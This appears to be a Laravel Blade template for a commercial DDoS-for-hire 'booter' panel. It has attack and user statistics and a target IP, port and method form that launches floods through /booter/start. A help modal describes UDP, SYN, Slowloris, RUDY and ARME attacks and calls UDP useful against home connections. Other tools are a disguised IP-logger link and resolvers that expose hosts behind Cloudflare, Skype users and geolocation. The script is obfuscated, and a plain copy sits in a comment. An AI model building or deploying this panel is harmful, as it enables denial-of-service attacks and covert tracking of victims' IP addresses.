@layout('main')


@section('script')
<script>
    $(document).ready( function()
    {
        $.get('/booter/onlineservers', function(data)
        {
           $('#servers_online').html(data);
        });

        setInterval(function()
        {
            $.get('/booter/getstats').done(function(data)
            {
                result = $.parseJSON(data);
                $('#servers_count').text(result[0]);
                $('#servers_online').text(result[1]);
                $('#attacks_count').text(result[2]);
                $('#running_attacks_count').text(result[3]);
                $('#users_count').text(result[4]);
                $('#online_users_count').text(result[5]);
                $('#plans_count').text(result[6]);
            });
        }, 15000)

    });

    var _0xc056=["\x23\x73\x74\x61\x74\x75\x73","\x73\x63\x72\x6F\x6C\x6C\x48\x65\x69\x67\x68\x74","\x70\x72\x6F\x70","\x68\x65\x69\x67\x68\x74","\x61\x6E\x69\x6D\x61\x74\x65","\x3C\x62\x72\x20\x2F\x3E","\x41\x74\x74\x61\x63\x6B\x20\x73\x74\x61\x72\x74\x69\x6E\x67\x20\x69\x6E\x20\x33\x2C\x20\x32\x2C\x20\x31\x2E\x2E\x20\x53\x74\x61\x72\x74\x65\x64\x21\x20\x3C\x62\x72\x20\x2F\x3E","\x61\x70\x70\x65\x6E\x64","\x64\x69\x73\x61\x62\x6C\x65\x64","","\x61\x74\x74\x72","\x72\x65\x6D\x6F\x76\x65\x41\x74\x74\x72","\x23\x73\x74\x61\x72\x74\x5F\x62\x74\x6E","\x76\x61\x6C","\x23\x69\x70","\x5B\x6E\x61\x6D\x65\x3D\x73\x74\x6F\x70\x5F\x69\x70\x5D","\x64\x6F\x6E\x65","\x50\x4F\x53\x54","\x2F\x62\x6F\x6F\x74\x65\x72\x2F\x73\x74\x61\x72\x74","\x23\x70\x6F\x72\x74","\x23\x74\x69\x6D\x65","\x5B\x6E\x61\x6D\x65\x3D\x6D\x65\x74\x68\x6F\x64\x5D","\x61\x6A\x61\x78","\x63\x6C\x69\x63\x6B","\x23\x73\x74\x6F\x70\x5F\x69\x70","\x38\x30","\x31","\x73\x74\x6F\x70","\x23\x73\x74\x6F\x70\x5F\x62\x74\x6E","\x30","\x67\x65\x74\x46\x75\x6C\x6C\x59\x65\x61\x72","\x2D","\x67\x65\x74\x4D\x6F\x6E\x74\x68","\x67\x65\x74\x44\x61\x74\x65","\x20\x20","\x67\x65\x74\x48\x6F\x75\x72\x73","\x3A","\x67\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x67\x65\x74\x53\x65\x63\x6F\x6E\x64\x73","\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x77\x69\x64\x74\x68\x3A\x31\x36\x30\x70\x78\x22\x3E\x5B\x20","\x20\x5D\x20\x3C\x2F\x73\x70\x61\x6E\x3E","\x43\x6C\x6F\x75\x64\x66\x61\x72\x65\x20\x72\x65\x73\x6F\x6C\x76\x65\x20\x72\x65\x73\x75\x6C\x74\x73","\x23\x63\x66\x72\x65\x73\x6F\x6C\x76\x65","\x2F\x62\x6F\x6F\x74\x65\x72\x2F\x63\x66\x72\x65\x73\x6F\x6C\x76\x65\x2F","\x23\x63\x66\x72\x65\x73\x6F\x6C\x76\x65\x5F\x68\x6F\x73\x74","\x49\x50\x20\x72\x65\x73\x6F\x6C\x76\x65\x20\x72\x65\x73\x75\x6C\x74","\x23\x69\x70\x72\x65\x73\x6F\x6C\x76\x65","\x2F\x62\x6F\x6F\x74\x65\x72\x2F\x69\x70\x72\x65\x73\x6F\x6C\x76\x65\x2F","\x23\x69\x70\x72\x65\x73\x6F\x6C\x76\x65\x5F\x68\x6F\x73\x74","\x53\x6B\x79\x70\x65\x20\x72\x65\x73\x6F\x6C\x76\x65\x20\x72\x65\x73\x75\x6C\x74","\x23\x73\x6B\x79\x70\x65\x72\x65\x73\x6F\x6C\x76\x65","\x2F\x62\x6F\x6F\x74\x65\x72\x2F\x73\x6B\x79\x70\x65\x72\x65\x73\x6F\x6C\x76\x65\x2F","\x23\x73\x6B\x79\x70\x65\x5F\x75\x73\x65\x72\x6E\x61\x6D\x65","\x47\x65\x6F\x20\x72\x65\x73\x6F\x6C\x76\x65\x20\x72\x65\x73\x75\x6C\x74","\x23\x67\x65\x6F\x72\x65\x73\x6F\x6C\x76\x65","\x2F\x62\x6F\x6F\x74\x65\x72\x2F\x67\x65\x6F\x72\x65\x73\x6F\x6C\x76\x65\x2F","\x23\x67\x65\x6F\x5F\x69\x70","\x23\x64\x6F\x77\x6E\x6F\x72\x6E\x6F\x74","\x2F\x62\x6F\x6F\x74\x65\x72\x2F\x64\x6F\x77\x6E\x6F\x72\x6E\x6F\x74\x2F","\x23\x68\x6F\x73\x74","\x23\x6E\x6F\x74\x65\x73\x5F\x73\x61\x76\x65","\x68\x74\x6D\x6C","\x23\x6E\x6F\x74\x65\x73\x5F\x73\x61\x76\x65\x5F\x74\x69\x6D\x65","\x2F\x62\x6F\x6F\x74\x65\x72\x2F\x73\x61\x76\x65\x6E\x6F\x74\x65\x73","\x23\x6E\x6F\x74\x65\x73","\x23\x74\x61\x62\x6C\x65\x2D\x69\x70\x6C\x6F\x67","\x47\x45\x54","\x2F\x62\x6F\x6F\x74\x65\x72\x2F\x69\x70\x6C\x6F\x67\x72\x65\x66\x72\x65\x73\x68","\x23\x69\x70\x6C\x6F\x67\x5F\x72\x65\x66\x72\x65\x73\x68","\x53\x61\x76\x69\x6E\x67\x2E\x2E\x2E","\x74\x65\x78\x74","\x53\x61\x76\x65","\x23\x69\x70\x6C\x6F\x67\x5F\x6C\x69\x6E\x6B\x5F\x73\x61\x76\x65","\x62\x61\x64\x6C\x69\x6E\x6B","\x49\x6E\x76\x61\x6C\x69\x64\x20\x6C\x69\x6E\x6B","\x2F\x62\x6F\x6F\x74\x65\x72\x2F\x73\x61\x76\x65\x6C\x69\x6E\x6B","\x5B\x6E\x61\x6D\x65\x3D\x69\x70\x6C\x6F\x67\x5F\x74\x78\x74\x5D","\x72\x65\x61\x64\x79"];$(document)[_0xc056[77]](function (){var _0x3c8cx1=$(_0xc056[0]);function _0x3c8cx2(){_0x3c8cx1[_0xc056[4]]({scrollTop:_0x3c8cx1[_0xc056[2]](_0xc056[1])-_0x3c8cx1[_0xc056[3]]()},0);} ;$(_0xc056[12])[_0xc056[23]](function (){$(_0xc056[0])[_0xc056[7]](_0xc056[5]+_0x3c8cx6()+_0xc056[6]);_0x3c8cx2();$(this)[_0xc056[10]](_0xc056[8],_0xc056[9]);setTimeout(function (){$(_0xc056[12])[_0xc056[11]](_0xc056[8]);} ,4000);$[_0xc056[22]]({type:_0xc056[17],url:_0xc056[18],data:{ip:$(_0xc056[14])[_0xc056[13]](),port:$(_0xc056[19])[_0xc056[13]](),time:$(_0xc056[20])[_0xc056[13]](),method:$(_0xc056[21])[_0xc056[13]]()}})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[0])[_0xc056[7]](_0xc056[5]+_0x3c8cx6()+_0x3c8cx3);$(_0xc056[15])[_0xc056[13]]($(_0xc056[14])[_0xc056[13]]());_0x3c8cx2();} );} );$(_0xc056[28])[_0xc056[23]](function (){$[_0xc056[22]]({type:_0xc056[17],url:_0xc056[18],data:{ip:$(_0xc056[24])[_0xc056[13]](),port:_0xc056[25],time:_0xc056[26],method:_0xc056[27]}})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[0])[_0xc056[7]](_0xc056[5]+_0x3c8cx6()+_0x3c8cx3);_0x3c8cx2();} );} );function _0x3c8cx4(_0x3c8cx5){return _0x3c8cx5<10?_0xc056[29]+_0x3c8cx5:_0x3c8cx5;} ;function _0x3c8cx6(){var _0x3c8cx7= new Date();var _0x3c8cx8=_0x3c8cx7[_0xc056[30]]()+_0xc056[31]+_0x3c8cx4(_0x3c8cx7[_0xc056[32]]()+1)+_0xc056[31]+_0x3c8cx4(_0x3c8cx7[_0xc056[33]]())+_0xc056[34]+_0x3c8cx4(_0x3c8cx7[_0xc056[35]]())+_0xc056[36]+_0x3c8cx4(_0x3c8cx7[_0xc056[37]]())+_0xc056[36]+_0x3c8cx4(_0x3c8cx7[_0xc056[38]]());return _0xc056[39]+_0x3c8cx8+_0xc056[40];} ;$(_0xc056[42])[_0xc056[23]](function (){$(this)[_0xc056[10]](_0xc056[8],_0xc056[9]);$[_0xc056[22]]({type:_0xc056[17],url:_0xc056[43],data:{hostname:$(_0xc056[44])[_0xc056[13]]()}})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[0])[_0xc056[7]](_0xc056[5]+_0x3c8cx6()+_0xc056[41]+_0x3c8cx3);$(_0xc056[42])[_0xc056[11]](_0xc056[8]);_0x3c8cx2();} );} );$(_0xc056[46])[_0xc056[23]](function (){$(this)[_0xc056[10]](_0xc056[8],_0xc056[9]);$[_0xc056[22]]({type:_0xc056[17],url:_0xc056[47],data:{hostname:$(_0xc056[48])[_0xc056[13]]()}})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[0])[_0xc056[7]](_0xc056[5]+_0x3c8cx6()+_0xc056[45]+_0x3c8cx3);$(_0xc056[46])[_0xc056[11]](_0xc056[8]);_0x3c8cx2();} );} );$(_0xc056[50])[_0xc056[23]](function (){$(this)[_0xc056[10]](_0xc056[8],_0xc056[9]);$[_0xc056[22]]({type:_0xc056[17],url:_0xc056[51],data:{skypeusername:$(_0xc056[52])[_0xc056[13]]()}})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[0])[_0xc056[7]](_0xc056[5]+_0x3c8cx6()+_0xc056[49]+_0x3c8cx3);$(_0xc056[50])[_0xc056[11]](_0xc056[8]);_0x3c8cx2();} );} );$(_0xc056[54])[_0xc056[23]](function (){$(this)[_0xc056[10]](_0xc056[8],_0xc056[9]);$[_0xc056[22]]({type:_0xc056[17],url:_0xc056[55],data:{geoip:$(_0xc056[56])[_0xc056[13]]()}})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[0])[_0xc056[7]](_0xc056[5]+_0x3c8cx6()+_0xc056[53]+_0x3c8cx3);$(_0xc056[54])[_0xc056[11]](_0xc056[8]);_0x3c8cx2();} );} );$(_0xc056[57])[_0xc056[23]](function (){$(this)[_0xc056[10]](_0xc056[8],_0xc056[9]);$[_0xc056[22]]({type:_0xc056[17],url:_0xc056[58],data:{host:$(_0xc056[59])[_0xc056[13]]()}})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[0])[_0xc056[7]](_0xc056[5]+_0x3c8cx6()+_0x3c8cx3);$(_0xc056[57])[_0xc056[11]](_0xc056[8]);_0x3c8cx2();} );} );$(_0xc056[60])[_0xc056[23]](function (){$(this)[_0xc056[10]](_0xc056[8],_0xc056[9]);$[_0xc056[22]]({type:_0xc056[17],url:_0xc056[63],data:{notes:$(_0xc056[64])[_0xc056[13]]()}})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[60])[_0xc056[11]](_0xc056[8]);$(_0xc056[62])[_0xc056[61]](_0x3c8cx3);} );} );$(_0xc056[68])[_0xc056[23]](function (){$[_0xc056[22]]({type:_0xc056[66],url:_0xc056[67]})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[65])[_0xc056[61]](_0x3c8cx3);} );} );$(_0xc056[72])[_0xc056[23]](function (){$(this)[_0xc056[10]](_0xc056[8],_0xc056[9])[_0xc056[70]](_0xc056[69]);$[_0xc056[22]]({type:_0xc056[17],url:_0xc056[75],data:{link:$(_0xc056[76])[_0xc056[13]]()}})[_0xc056[16]](function (_0x3c8cx3){$(_0xc056[72])[_0xc056[11]](_0xc056[8])[_0xc056[70]](_0xc056[71]);if(_0x3c8cx3==_0xc056[73]){alert(_0xc056[74]);return ;} ;} );} );$(_0xc056[68])[_0xc056[23]]();} );

</script>
@endsection


@section('content')

<div class="span12" style="padding-bottom:25px;">
    <div class="booter-stats-wrap">
        <div style="width:820px; margin: 0 auto;">
            <div class="booter-stats">
                <img src="/img/booter/server.png" title="Total server count" />
                <h5>Servers</h5>
                <h4 id="servers_count">{{ Server::count() }}</h4>
            </div>
            <div class="booter-stats">
                <img src="/img/booter/server-online.png" title="Total online servers" />
                <h5>Online</h5>
                <h4><span id="servers_online">...</span></h4>
            </div>
            <div class="booter-stats">
                <img src="/img/booter/boot.png" title="Total attack count" />
                <h5>Attacks</h5>
                <h4 id="attacks_count">{{ Attack::count() }}</h4>
            </div>
            <div class="booter-stats">
                <img src="/img/booter/boot-running.png" title="Total running attacks" />
                <h5>Attacks</h5>
                <h4 id="running_attacks_count">{{ Attack::where( DB::raw('(created_at + INTERVAL time SECOND)'), '>', DB::raw( 'NOW()' ) )->count()  }}</h4>
            </div>
            <div class="booter-stats">
                <img src="/img/booter/user.png" title="Total user count" style="width:48px; height:44px; margin-top:2px; padding-bottom:2px;"/>
                <h5>Users</h5>
                <h4 id="users_count">{{ User::count() }}</h4>
            </div>
            <div class="booter-stats">
                <img src="/img/booter/user-online.png" title="Total online user count" style="width:48px; height:44px; margin-top:2px; padding-bottom:2px;"/>
                <h5>Online</h5>
                <h4 id="online_users_count">{{ User::where(DB::raw('updated_at'), '>', DB::raw('NOW() - INTERVAL 10 MINUTE'))->count() }} </h4>
            </div>
            <div class="booter-stats">
                <img src="/img/booter/active-plan.png" title="Total active plans" style="margin-left:15px;"/>
                <h5>Plans</h5>
                <h4 id="plans_count">{{ User::where(DB::raw('DATE(plan_expiry_date)'), '>', DB::raw('CURDATE()'))->count() }}</h4>
            </div>
        </div>



        <div class="clearfix"></div>
    </div>
</div>
<div class="span3">
    <h3>Target info</h3>

{{ Form::label('ip', 'Target IP address') }}
{{ Form::text('ip')}}

{{ Form::label('port', 'Port') }}
{{ Form::text('port') }}

{{ Form::label('time','Time to boot') }}
{{ Form::text('time', Auth::user()->time) }}

    {{ Form::label('method', 'Method') }}

    <?php
        //Get all methods
        $settings = parse_ini_file('application/config/config.ini');
        $methods = $settings['methods'];
        $methods = explode(',', $methods);
        for($i=0; $i<count($methods); $i++)
        {
            $m[$i] = $methods[$i];
        }
    ?>

    {{ Form::select('method', $m, $m[0]) }}
<br />
{{ Form::button('Start booting', array('class' => 'btn btn-danger', 'style' => 'width:220px;', 'id' => 'start_btn')) }}


</div>
<div class="span6 offset">
    <h3>Status log</h3> <a class='pull-right' style="margin-right:20px;margin-top:5px;word-break: break-all" href="#" onclick="$('#status').html('')">Clear status log</a>
    <div id="status" style="background-color:#2b2b2b; padding:15px; border-radius: 5px;">
        Awaiting start..




    </div>

</div>
<div class="span2" style="margin-left:40px;">
    <h3>Utilities</h3>
    <a href="#NotesModal" role="button" class="btn btn-danger btn-block" data-toggle="modal">Notes</a>
    <a href="#IPLogModal" role="button" class="btn btn-danger btn-block" data-toggle="modal">IP Logger</a>
    <a href="#AttackModal" role="button" class="btn btn-danger btn-block" data-toggle="modal">Methods help</a>


    <h3 style="padding-top:20px;">Stop attack</h3>
    {{ Form::label('stop_ip', 'Targeted IP to stop') }}
    {{ Form::text('stop_ip', '', array('style'=>'width:126px;') ) }}
    <br/>
    {{ Form::button('Stop boot', array('class' => 'btn btn-danger', 'style'=>'width:140px;', 'id' => 'stop_btn')) }}

</div>

<div id="NotesModal" class="modal hide fade " tabindex="-1" role="dialog" aria-labelledby="NotesModalLabel" aria-hidden="true">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3>Notes</h3>
    </div>
    <div class="modal-body">
        {{ Form::textarea('notes', Auth::user()->notes, array('style' => 'max-width:515px;width:515px;max-height:350px;height:530px;', 'id' => 'notes')) }}
    </div>
    <div class="modal-footer">
        <span id="notes_save_time"></span>
        <button class="btn btn-inverse btn-small" data-dismiss="modal" aria-hidden="true">Close</button>
        <button id="notes_save" class="btn btn-danger btn-small">Save</button>
    </div>
</div>

<div id="IPLogModal" class="modal hide fade " tabindex="-1" role="dialog" aria-labelledby="IPLogModalLabel" aria-hidden="true">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3>IP Logger</h3>
        <a href="#refresh" id="iplog_refresh">Refresh</a>
    </div>
    <div class="modal-body">

        <div id="table-iplog">

        </div>

    </div>
    <div class="modal-footer">
        <div id="iplog_info" style="float:left;">
        <table style="text-align: left;">

            <tr><td>Your IP log link:</td> <td><a href="http://{{$_SERVER['SERVER_NAME']}}/meme/show/{{Auth::user()->id}}">http://{{$_SERVER['SERVER_NAME']}}/meme/show/{{Auth::user()->id}}</a></td> </tr>
            <tr><td>Redirect link to:</td> <td>


                @if(empty(Auth::user()->iplog_link) || Auth::user()->iplog_link === '')
                {{ Form::text('iplog_txt', 'http://9gag.com/gag/'.rand(300, 6000000)) }}
                @else
                {{ Form::text('iplog_txt', Auth::user()->iplog_link) }}
                @endif
                <span id="iplog_saved"></span>
           </td>
            </tr>
        </table>
        </div>
        <div class='btn-group' style="margin-top:30px;">
        <button class="btn btn-danger" data-dismiss="modal" aria-hidden="true">Close</button>
        <button id="iplog_link_save" class="btn btn-danger">Save</button>
        </div>
    </div>
</div>


<div id="AttackModal" class="modal hide fade " tabindex="-1" role="dialog" aria-labelledby="AttackModalLabel" aria-hidden="true">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3>Notes</h3>
    </div>
    <div class="modal-body">
        <p>
            <h5>UDP</h5>
            A UDP flood attack is a denial-of-service (DoS) attack using the User Datagram Protocol (UDP), a sessionless/connectionless computer networking protocol.
            Useful for attacking home connections.
        </p>
        <p>
            <h5>UDPLag</h5>
            Just like UDP but won't hit the target offline, instead it will make them lag.
        </p>
        <p>
            <h5>SYN Flood</h5>
            SYN abuses the TCP's three-way handshake, by never responding to the target's TCP confirmation response, thus making it wait indefinitely.
        </p>
        <p>
            <h5>Slowloris</h5>
            An extremely useful method to webservers running Apache, Tomcat and GoAhead.
            By keeping as many as possible connections open for as long as possible by only sending partial requests and thus blocks access to the server for other clients.
        </p>
        <p>
            <h5>Rudy (R U Dead Yet)</h5>
            By sending small packets of 1 bytes through a HTTP POST request it will force the connection with the server to stay open.
            Rudy is harder to detect and prevent.
        </p>
        <p>
            <h5>ARME</h5>
            ARME is considered a layer 4 attack method. It's pretty strong due to it eating up all the SWAP memory on an Apache server, eventually letting it flood <i>even</i> the HDD resulting into a shutdown of said server.
        </p>

    </div>
    <div class="modal-footer">

        <button class="btn btn-danger btn-small" data-dismiss="modal" aria-hidden="true">Close</button>
    </div>
</div>


<div class="span12" style="margin-top:30px;">
    <div style="width:750px; margin:0 auto;">
        <div class="resolver">
            <h5>Cloudflare</h5>
            {{ Form::label('cfresolve_host', 'Hostname') }}
            {{ Form::text('cfresolve_host', '', array('class' => 'input-block-level')) }}
            {{ Form::button('Resolve', array('class' => 'btn btn-small btn-danger btn-block', 'id' => 'cfresolve')) }}
            {{ Form::close() }}
        </div>
        <div class="resolver">
            <h5>To IP address</h5>
            {{ Form::label('ipresolve_host', 'Hostname') }}
            {{ Form::text('ipresolve_host', '', array('class' => 'input-block-level')) }}
            {{ Form::button('Resolve', array('class' => 'btn btn-small btn-danger btn-block', 'id' => 'ipresolve')) }}
            {{ Form::close() }}
        </div>
        <div class="resolver">
            <h5>Skype</h5>
            {{ Form::label('skype_username', 'Username') }}
            {{ Form::text('skype_username', '', array('class' => 'input-block-level')) }}
            {{ Form::button('Resolve', array('class' => 'btn btn-small btn-danger btn-block', 'id' => 'skyperesolve')) }}
            {{ Form::close() }}
        </div>
        <div class="resolver">
            <h5>Geo location</h5>
            {{ Form::label('geo_ip', 'IP address') }}
            {{ Form::text('geo_ip', '', array('class' => 'input-block-level')) }}
            {{ Form::button('Resolve', array('class' => 'btn btn-small btn-danger btn-block', 'id' => 'georesolve')) }}
            {{ Form::close() }}
        </div>
        <div class="resolver">
            <h5>Down or not</h5>
            {{ Form::label('host', 'Website URL') }}
            {{ Form::text('host', '', array('class' => 'input-block-level')) }}
            {{ Form::button('Check', array('class' => 'btn btn-small btn-danger btn-block', 'id' => 'downornot')) }}
            {{ Form::close() }}
        </div>
        <div class="clearfix"></div>
    </div>
</div>

@endsection

<?php
// Unobfuscated Javascript
/*
    $(document).ready( function ()
    {
        var status = $('#status');
        function scroll()
        {
            status.animate({ scrollTop: status.prop("scrollHeight") - status.height() }, 0);
        }
        $('#start_btn').click( function ()
        {
            $('#status').append('<br />'+cur_time()+'Attack starting in 3, 2, 1.. Started! <br />');
            scroll();
            $(this).attr('disabled', '');
            setTimeout(function() {
                $('#start_btn').removeAttr('disabled')
            }, 4000);
            $.ajax({
                type: 'POST',
                url: '/booter/start',
                data:   {
                    ip: $('#ip').val(),
                    port: $('#port').val(),
                    time: $('#time').val(),
                    method: $('[name=method]').val()
                }

            }).done(function(data)
                {
                    $('#status').append("<br />" + cur_time()+data);
                    $('[name=stop_ip]').val($('#ip').val());
scroll();
                });
        });

        $('#stop_btn').click( function ()
        {
            $.ajax({
                type: 'POST',
                url: '/booter/start',
                data:   {
                    ip: $('#stop_ip').val(),
                    port: '80',
                    time: '1',
                    method: 'stop'
                        }
            }).done( function(data)
                {
                    $('#status').append("<br />" + cur_time()+data);
scroll();
                });
        });

        function pad(n){return n<10 ? '0'+n : n}
        function cur_time()
        {
            var currentdate = new Date();
            var datetime = currentdate.getFullYear() + "-"
                + pad(currentdate.getMonth()+1) + "-"
                + pad(currentdate.getDate() ) + "  "
                + pad(currentdate.getHours()) + ":"
                + pad(currentdate.getMinutes()) + ":"
                + pad(currentdate.getSeconds());
            return '<span style="width:160px">[ '+datetime+' ] </span>';
        }

        $('#cfresolve').click( function ()
        {
            $(this).attr('disabled', '');
            $.ajax({
                type: "POST",
                url: '/booter/cfresolve/',
                data: {hostname: $('#cfresolve_host').val()}}).done(function(data)
                {
                    $('#status').append('<br />' + cur_time()+ 'Cloudfare resolve results' +data);
                    $('#cfresolve').removeAttr('disabled');
                    scroll();
                });

        });

        $('#ipresolve').click( function ()
        {
            $(this).attr('disabled', '');
            $.ajax({
                type: "POST",
                url: '/booter/ipresolve/',
                data: {hostname: $('#ipresolve_host').val()}}).done(function(data)
                {
                    $('#status').append('<br />' + cur_time()+ 'IP resolve result' +data);
                    $('#ipresolve').removeAttr('disabled');
                    scroll();
                });

        });

        $('#skyperesolve').click( function ()
        {
            $(this).attr('disabled', '');
            $.ajax({
                type: "POST",
                url: '/booter/skyperesolve/',
                data: {skypeusername: $('#skype_username').val()}
            }).done( function (data)
                {
                    $('#status').append('<br />' + cur_time() + 'Skype resolve result' + data);
                    $('#skyperesolve').removeAttr('disabled');
                    scroll();
                });
        })

        $('#georesolve').click( function ()
        {
            $(this).attr('disabled', '');
            $.ajax({
                type: "POST",
                url: '/booter/georesolve/',
                data: {geoip: $('#geo_ip').val()}
            }).done( function (data)
                {
                    $('#status').append('<br />' + cur_time() + 'Geo resolve result' + data);
                    $('#georesolve').removeAttr('disabled');
                    scroll();
                });
        });


        $('#downornot').click( function()
        {
            $(this).attr('disabled', '');
            $.ajax({
                type: "POST",
                url: '/booter/downornot/',
                data: {host: $('#host').val()}
            }).done( function (data)
                {
                    $('#status').append('<br />' + cur_time() + data);
                    $('#downornot').removeAttr('disabled');
                    scroll();
                });
        });





        $('#notes_save').click( function ()
        {
            $(this).attr('disabled', '');
            $.ajax({
                type: "POST",
                url: '/booter/savenotes',
                data: {notes:$('#notes').val()}
            }).done( function(data)
                {
                    $('#notes_save').removeAttr('disabled');
                    $('#notes_save_time').html(data);
                });
        });

        $('#iplog_refresh').click( function ()
        {
            $.ajax({
                type: "GET",
                url: '/booter/iplogrefresh'
            }).done( function( data )
                {
                    $('#table-iplog').html(data);
                });
        });

        $('#iplog_link_save').click( function ()
        {
            $(this).attr('disabled', '').text('Saving...');
            $.ajax({
                type: "POST",
                url: '/booter/savelink',
                data: {link:$('[name=iplog_txt]').val()}
            }).done( function (data)
                {

                    $('#iplog_link_save').removeAttr('disabled').text('Save');
                    if(data == 'badlink')
                    {
                        alert('Invalid link');
                        return;
                    }

                });
        });



        $('#iplog_refresh').click();


    });
*/
?>
